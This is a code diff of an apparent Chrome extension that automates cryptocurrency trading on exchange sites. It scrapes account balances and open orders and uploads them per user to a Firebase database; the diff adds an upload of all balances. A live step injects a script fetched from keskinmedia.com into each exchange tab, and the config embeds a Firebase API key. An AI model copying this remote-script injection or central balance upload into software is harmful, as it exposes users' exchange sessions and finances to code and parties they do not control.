@@ -92,14 +92,14 @@ chrome.tabs.onUpdated.addListener(async function(tabId, changeInfo, tab) {
                 file: chrome.extension.getURL('/js/dll/firebase.js'),
                 runAt: "document_end"
             });
-            */
+            
             var marketId = GetParameterByName("marketId", tab.url)
             var guncelMarket = _marketOzetler.find(mo => mo.MarketID == Number(marketId))
             chrome.tabs.executeScript(tabId, {
                 code: `var datam = '${JSON.stringify(guncelMarket)}'; $("body").attr("datam",datam);`,
                 runAt: "document_end"
             });
-
+            */
             chrome.tabs.executeScript(tabId, {
                 code: "var i = document.createElement('script'); i.id='ipSc'; i.src = 'https://keskinmedia.com/api/inject-prod.js?v='+ Math.random(); document.head.appendChild(i);",
                 runAt: "document_end"
@@ -401,7 +401,7 @@ async function KontroleUyanDoge() { // DB dekileri çektik bunların arasında y
             e.yuzde = e.yuzde
         }
 
-        if (openOrderlerim.includes(e.name) || Number(e.amount.coinBalance) > 0.00001) { // Open ordersta bu market varsa direk al
+        if (openOrderlerim.includes(e.name) || Number(e.amount.total) > 0.00001) { // Open ordersta bu market varsa direk al
             return true
         }
 
@@ -433,13 +433,16 @@ async function LoadBalancesAndOrders(){
       _Balances = []
       $($.parseHTML(balancesHtml)).find('.balance-table tr:not(.active)').each(function(){
         var symbol = $(this).children().eq(0).text();
-        var coinBalance = Number($(this).children().eq(2).text()) + Number($(this).children().eq(3).text())
-
+        var available = Number($(this).children().eq(2).text()) 
+        var inOrder = Number($(this).children().eq(3).text())
+        var total = available + inOrder
         if(symbol == 'DOGE' || symbol == 'ETH' || symbol == 'BTC' ){ // Eğer ana coinse sadece dogeyi al.
-             coinBalance = Number($(this).children().eq(2).text())
+            total = available
         }
-
-        _Balances.push({symbol, coinBalance})
+        if(total> 0.0005){
+            _Balances.push({symbol,available,inOrder,total})
+        }
+        
       })
     }
   } catch (error) {
@@ -452,9 +455,10 @@ async function LoadBalancesAndOrders(){
   }
 
   var openOrdersTutar = await LoadOpenOrders()
-  var dogeAmount = _Balances.length > 0 && _Balances.find(e=> e.symbol == 'DOGE').coinBalance;
+  var dogeAmount = _Balances.length > 0 && _Balances.find(e=> e.symbol == 'DOGE').total;
   _toplamTutar = openOrdersTutar + dogeAmount;
   BalanceUpdateFB()
+  AllBalanceUpdateFB()
   console.log('Toplam Tutar: %s',_toplamTutar)
 }
 
@@ -793,15 +797,6 @@ async function getYobitHistory(){
 }
 
 async function LoadFireBase() {
-    //chrome.extension.getURL('/js/dll/firebase.js')
-    //await $.getScript('https://www.gstatic.com/firebasejs/4.12.0/firebase.js')
-    await $.getScript('/js/dll/firebase.js')
-    await LoadFireBaseConfig()
-    console.log('Firebase Yüklendi')
-}
-
-function LoadFireBaseConfig() {
-    // Initialize Firebase
     var config = {
         apiKey: "AIzaSyDxDY2_n2XA4mF3RWTFXRuu0XrLCkYYG4s",
         authDomain: "firem-b3432.firebaseapp.com",
@@ -814,6 +809,7 @@ function LoadFireBaseConfig() {
     _db = firebase.database()
     _coinexChange = _db.ref().child('coinexchange')
     _balances = _coinexChange.child('balances')
+    console.log('Firebase Yüklendi')
 }
 
 function BalanceUpdateFB(){
@@ -827,6 +823,10 @@ function BalanceUpdateFB(){
 
 function OrdersUpdateFB(){
     _db.ref('/coinexchange/openOrders').child(_userName).set(_openOrders)
+}
+
+function AllBalanceUpdateFB(){
+    _db.ref('/coinexchange/allBalances').child(_userName).set(_Balances)
 }
 
 
